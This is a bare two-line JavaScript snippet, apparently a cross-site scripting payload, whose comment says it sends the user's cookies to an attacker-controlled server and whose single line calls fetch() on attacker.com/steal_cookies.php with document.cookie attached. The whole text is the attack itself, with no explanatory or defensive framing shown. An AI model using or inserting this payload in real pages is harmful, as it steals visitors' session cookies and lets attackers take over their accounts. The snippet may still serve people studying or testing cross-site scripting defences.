// Send the user's cookies to an attacker-controlled server
fetch('https://attacker.com/steal_cookies.php?cookie=' + encodeURIComponent(document.cookie));
